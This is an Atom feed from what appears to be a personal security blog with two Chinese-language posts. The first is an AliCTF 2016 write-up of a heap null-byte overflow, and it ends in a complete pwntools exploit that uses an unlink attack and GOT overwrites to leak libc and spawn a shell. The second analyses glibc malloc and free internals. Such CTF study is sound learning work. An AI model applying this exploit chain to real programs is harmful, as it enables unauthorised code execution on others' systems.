<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Arvin.X&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://a7vinx.github.io/"/>
  <updated>2016-11-01T12:18:38.356Z</updated>
  <id>http://a7vinx.github.io/</id>
  
  <author>
    <name>Arvin.X</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AliCTF 2016 fb writeup</title>
    <link href="http://a7vinx.github.io/2016/06/07/alictf_2016_fb_writeup/"/>
    <id>http://a7vinx.github.io/2016/06/07/alictf_2016_fb_writeup/</id>
    <published>2016-06-07T12:33:00.000Z</published>
    <updated>2016-11-01T12:18:38.356Z</updated>
    
    <content type="html"><![CDATA[<p>一道堆中的null byte溢出题</p>
<p>程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存</p>
<a id="more"></a>
<p>由于读取输入的时候会在最后再添加’\x00’：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:00000000004008E4                 cdqe</div><div class="line">.text:00000000004008E6                 lea     rdx, [rax-1]</div><div class="line">.text:00000000004008EA                 mov     rax, [rbp+var_18]</div><div class="line">.text:00000000004008EE                 add     rax, rdx</div><div class="line">.text:00000000004008F1                 mov     byte ptr [rax], 0</div><div class="line">.text:00000000004008F4                 mov     eax, [rbp+var_8]</div><div class="line">.text:00000000004008F7                 sub     eax, 1</div></pre></td></tr></table></figure></p>
<p>所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来…）</p>
<p>之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CANARY    : ENABLED</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : Partial</div></pre></td></tr></table></figure>
<p>所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用<a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">libc-database</a>这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址</p>
<p>然后泄漏出来算下偏移就可以调用system()了</p>
<p>Exploit:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">io=process(&apos;./fb&apos;)</div><div class="line"># io = remote(&quot;114.55.103.213&quot;,9733)</div><div class="line"></div><div class="line">SIZE=0xf8</div><div class="line">PLT_puts=0x4006C0</div><div class="line">GOT_free=0x602018</div><div class="line">GOT_read=0x602040</div><div class="line">FD=0x6020C8</div><div class="line">BK=0x6020D0</div><div class="line"></div><div class="line">def init(size):</div><div class="line">	io.recvuntil(&apos;Choice:&apos;)</div><div class="line">	io.sendline(&apos;1&apos;)</div><div class="line">	io.recvuntil(&apos;length:&apos;)</div><div class="line">	io.sendline(str(size))</div><div class="line">	io.recvuntil(&apos;Done~&apos;)</div><div class="line"></div><div class="line">def edit(index,content):</div><div class="line">	io.recvuntil(&apos;Choice:&apos;)</div><div class="line">	io.sendline(&apos;2&apos;)</div><div class="line">	io.recvuntil(&apos;index:&apos;)</div><div class="line">	io.sendline(str(index))</div><div class="line">	io.recvuntil(&apos;content:&apos;)</div><div class="line">	io.sendline(str(content))</div><div class="line">	io.recvuntil(&apos;Done~&apos;)</div><div class="line"></div><div class="line">def delete(index):</div><div class="line">	io.recvuntil(&apos;Choice:&apos;)</div><div class="line">	io.sendline(&apos;3&apos;)</div><div class="line">	io.recvuntil(&apos;index:&apos;)</div><div class="line">	io.sendline(str(index))</div><div class="line">	io.recvuntil(&apos;Done~&apos;)</div><div class="line"></div><div class="line">def leak(dst):</div><div class="line">	edit(1,p64(dst)+p64(SIZE)[:-1])</div><div class="line">	io.recvuntil(&apos;Choice:&apos;)</div><div class="line">	io.sendline(&apos;3&apos;)</div><div class="line">	io.recvuntil(&apos;index:&apos;)</div><div class="line">	io.sendline(&apos;0&apos;)</div><div class="line">	leakmem = io.recvuntil(&quot;Done~&quot;)[:-6]</div><div class="line">	return str(leakmem)</div><div class="line"></div><div class="line">def main():</div><div class="line"></div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line"></div><div class="line">	payload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+&apos;A&apos;*0xd0+p64(0xf0)</div><div class="line">	# overflow null byte</div><div class="line">	edit(2,payload)</div><div class="line">        # gdb.attach(io,execute=(&quot;b *%s&quot;%(0x400CCF)))</div><div class="line">	delete(3)</div><div class="line">        </div><div class="line">	payload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)</div><div class="line">	edit(2,payload2)</div><div class="line"></div><div class="line">	# modify GOT entry of free to PLT entry of puts</div><div class="line">	# use [:1] to prevent \x00 from causing damage</div><div class="line">	edit(2,p64(PLT_puts)[:-1])</div><div class="line"></div><div class="line">	# leak read_addr</div><div class="line">	read_addr=u64(leak(GOT_read).ljust(8,&apos;\x00&apos;))</div><div class="line">	print &quot;read_addr: &quot;+str(hex(read_addr))</div><div class="line"></div><div class="line"></div><div class="line">	system_addr=read_addr-0x980C0</div><div class="line">	# system_addr= read_addr-0xeb6a0 +0x46590</div><div class="line">	</div><div class="line">	# modify free to system</div><div class="line">	edit(2,p64(system_addr)[:-1])</div><div class="line">	edit(4,&quot;/bin/sh&quot;)</div><div class="line">	</div><div class="line">	# now get shell</div><div class="line">	io.recvuntil(&apos;Choice:&apos;)</div><div class="line">	io.sendline(&apos;3&apos;)</div><div class="line">	io.recvuntil(&apos;index:&apos;)</div><div class="line">	io.sendline(&apos;4&apos;)</div><div class="line"></div><div class="line">	io.interactive()</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一道堆中的null byte溢出题&lt;/p&gt;
&lt;p&gt;程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux下Glibc 堆的malloc及free过程分析</title>
    <link href="http://a7vinx.github.io/2016/05/29/linux_heap_analysis/"/>
    <id>http://a7vinx.github.io/2016/05/29/linux_heap_analysis/</id>
    <published>2016-05-29T13:03:00.000Z</published>
    <updated>2016-11-01T12:18:38.440Z</updated>
    
    <content type="html"><![CDATA[<p>想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="external">这篇分析</a>之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。</p>
<a id="more"></a>
<h2 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h2><p>（fastbin的分配发生在链表的头部，其余都发生在链表尾部）<br>（在fast链表中是精确分配（只有大小完全符合才会分配）<br>    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配<br>    small链表在第一遍时是精确分配，第二遍时非精确<br>    large链表一直都是非精确分配）（注意链表和chunk不一样）<br>（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）</p>
<p>1、首先获取Arena的锁，保证安全<br>2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）<br>——一种情况是没有可用Arena<br>没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0<br>——另一种情况是有可用Arena<br>1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）<br>2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）<br>3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步<br>4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）<br>5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回<br>6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回</p>
<h4 id="关于sysmalloc"><a href="#关于sysmalloc" class="headerlink" title="关于sysmalloc"></a>关于sysmalloc</h4><p>1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）<br>2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配<br>如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）<br>最后再从top chunk中分配</p>
<h4 id="按fast-bin、small-bin、large-bin分"><a href="#按fast-bin、small-bin、large-bin分" class="headerlink" title="按fast bin、small bin、large bin分"></a>按fast bin、small bin、large bin分</h4><p>1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样<br>2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统<br>3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统</p>
<h4 id="关于巨块的分配"><a href="#关于巨块的分配" class="headerlink" title="关于巨块的分配"></a>关于巨块的分配</h4><p>没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap<br>mmap分配的未必就一定是大的chunk</p>
<h2 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h2><p>（所有chunk的释放都是插入链表头部）<br>然后做一些基本的检查，比如size大小等<br>1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）<br>2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头<br>合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap<br>（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）<br>3、直接munmap返回给操作系统</p>
<h4 id="来自源码中的注释"><a href="#来自源码中的注释" class="headerlink" title="来自源码中的注释"></a>来自源码中的注释</h4><p>chunk不会被放回到normal bin中直到它们获得一次被malloc的机会<br>Chunks are not placed into regular bins until after they have been given one chance to be used in malloc</p>
<h4 id="关于获取Size"><a href="#关于获取Size" class="headerlink" title="关于获取Size"></a>关于获取Size</h4><p>获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）</p>
<h2 id="关于堆的收缩"><a href="#关于堆的收缩" class="headerlink" title="关于堆的收缩"></a>关于堆的收缩</h2><p>如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk</p>
<h4 id="来自源码中的注释-1"><a href="#来自源码中的注释-1" class="headerlink" title="来自源码中的注释"></a>来自源码中的注释</h4><p>收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理</p>
<p>最后附一张图：<br><img src="/images/linux_heap_analysis0.png" alt="heap.png"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了&lt;a href=&quot;https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/&quot;&gt;这篇分析&lt;/a&gt;之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
